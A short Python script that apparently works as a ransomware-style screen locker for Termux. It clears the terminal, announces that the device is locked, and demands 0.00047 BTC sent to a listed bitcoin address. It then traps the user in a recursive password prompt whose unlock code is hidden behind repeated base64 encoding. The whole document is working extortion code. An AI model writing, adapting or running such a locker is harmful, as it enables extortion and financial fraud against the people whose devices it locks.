import os, sys, base64, subprocess, platform

o = 1
def clear():
    if platform.system() == "Windows":
        subprocess.Popen("cls",
                         shell=True).communicate()
    else:  # Linux and Mac
        print("\033c", end="")

def pas():
    clear()
    print("your Termux is locked")
    print("sent 0.00047BTC to unlock")
    print("bitcoin : bc1q3gze9zmeg2gqc875cg3ejw4fclnjwykqpmj4ll")
    print("a small payment will be the Password")
    print("")
    message = str(input("Password : "))
    if str(message) == "^c" or str(message) == "^C":
        pas()
    else:
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        for i in range(1, 15):
            message_bytes = base64_message.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')

            if str(base64_message) == "Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V1ZsbDNXa1JTVjFKdGVEQmFWVll3VjBaS2RHVkdXbFpOYWtFeFZtcEtTMUl5U2tWVWJHaG9UVlZ3VlZadGNFZFpWMUpJVm10V1VtSklRazlVVkVKTFUxWmtWMVp0UmxSTmF6RTBWa2MxVDFkSFNrZGpSVGxhWWxoU1RGWnNXbUZrUjA1R1UyMTRVMkpXU2twV2JURXdWakZXZEZOc1dsaGlSa3BZV1d4b2IyVnNVbFZTYlVacVZtczFlRlpYZUhkV01ERkZVbFJDVjJFeVRYaFdSRXBIVmpGT2RWUnNhR2xoTUhCWVYxZDRiMkl4WkVkVmJrcFlZbFZhY1ZSV1duZE5SbFowWlVkMFZXSkdjREZWVjNodlZqRktjMk5HYUZkaGEzQklWVEJhWVdSV1NuTlRiR1JUVFRBd01RPT0=":
                clear()
                os.system("cd $HOME")
                os.system("figlet unlockek")
                sys.exit()

            elif i == 14:
                pas()
pas()


